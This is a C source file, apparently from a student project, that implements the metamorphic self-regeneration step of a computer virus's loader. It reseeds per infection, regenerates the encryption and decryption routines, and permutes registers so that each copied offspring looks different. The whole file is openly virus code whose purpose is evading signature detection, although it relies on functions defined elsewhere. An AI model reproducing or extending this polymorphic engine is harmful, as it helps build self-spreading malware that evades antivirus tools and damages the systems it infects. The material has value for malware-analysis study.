/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   metamorph_self.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/12/11 01:29:20 by anselme           #+#    #+#             */
/*   Updated: 2019/12/27 02:10:42 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "polymorphism.h"
#include "errors.h"
#include "loader.h"

/*
** metamorph_self is a metamorphic generator for the virus loader.
**   It works by regenerating its own loader
**   (overwriting the one that is loaded in memory)
**   before it is copied by our virus later on.
*/

bool		metamorph_self(uint64_t son_seed[2], uint64_t client_id)
{
	uint64_t	unique_seed = polymorphic_seed_engine(son_seed, client_id);
	size_t		cypher_size = (size_t)cypher_end - (size_t)cypher;
	size_t		loader_size = return_to_client - mark_below;
	size_t		reg_permutable_loader = end_of_reg_permutable_code - mark_below;

	if (!generate_cypher((void *)cypher, unique_seed, cypher_size)
	|| !generate_decypher((void *)decypher, unique_seed, cypher_size)
	// || !permutate_instructions(mark_below, unique_seed, loader_size)
	|| !permutate_registers(mark_below, unique_seed, reg_permutable_loader)
	|| !true) // add more metamorphosis above!
		return errors(ERR_THROW, _ERR_METAMORPH_SELF);

	return true;
}
